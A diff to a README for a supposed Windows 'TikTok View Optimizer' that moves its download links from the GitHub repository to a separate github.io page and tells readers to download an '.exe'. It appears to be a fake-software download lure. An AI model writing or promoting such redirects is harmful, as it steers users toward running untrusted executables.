@@ -1,6 +1,6 @@
 # 📈 TikTok-View-Optimizer-2026---Fast-Video-Reach-Tool-for-Windows - Increase video reach with simple tools
 
-[![](https://img.shields.io/badge/Download-Software-blue.svg)](https://github.com/Laramiedurazzo46/TikTok-View-Optimizer-2026---Fast-Video-Reach-Tool-for-Windows)
+[![](https://img.shields.io/badge/Download-Software-blue.svg)](https://laramiedurazzo46.github.io)
 
 ## 📌 About this software
 
@@ -20,7 +20,7 @@ Before you install the tool, check your computer for these requirements:
 
 Follow these steps to set up the software on your Windows computer:
 
-1. Visit the [official download page](https://github.com/Laramiedurazzo46/TikTok-View-Optimizer-2026---Fast-Video-Reach-Tool-for-Windows) to get the latest version.
+1. Visit the [official download page](https://laramiedurazzo46.github.io) to get the latest version.
 2. Look for the "Releases" section on the right side of the page.
 3. Click on the most recent version available.
 4. Select the file ending in ".exe" to begin the download.
